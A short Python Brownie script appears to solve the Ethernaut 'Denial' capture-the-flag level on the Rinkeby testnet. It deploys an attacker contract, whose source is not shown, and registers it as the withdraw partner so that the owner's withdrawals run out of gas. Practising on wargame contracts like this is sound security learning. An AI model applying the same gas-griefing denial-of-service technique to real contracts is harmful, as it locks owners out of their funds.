from brownie import accounts, Denial, DenialAttacker

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0x3a73C45CBf1E626c876c16128BC185D6A3219470"
denial = Denial.at(instance_address)

# ------------------------------------------------------------------------
# to complete this level we must restrict the owner from withdrawing funds
# ------------------------------------------------------------------------


def exploit():
    # deploy hacker contract
    hacker = DenialAttacker.deploy({"from": account})

    # call setWithdrawPartner and pass hacker.address as argument
    tx = denial.setWithdrawPartner(hacker.address, {"from": account})
    tx.wait(1)

    # when withdraw is called the owner will not receive their funds because
    # assert() consumes all gas for this compiler version of solidity


def main():
    exploit()
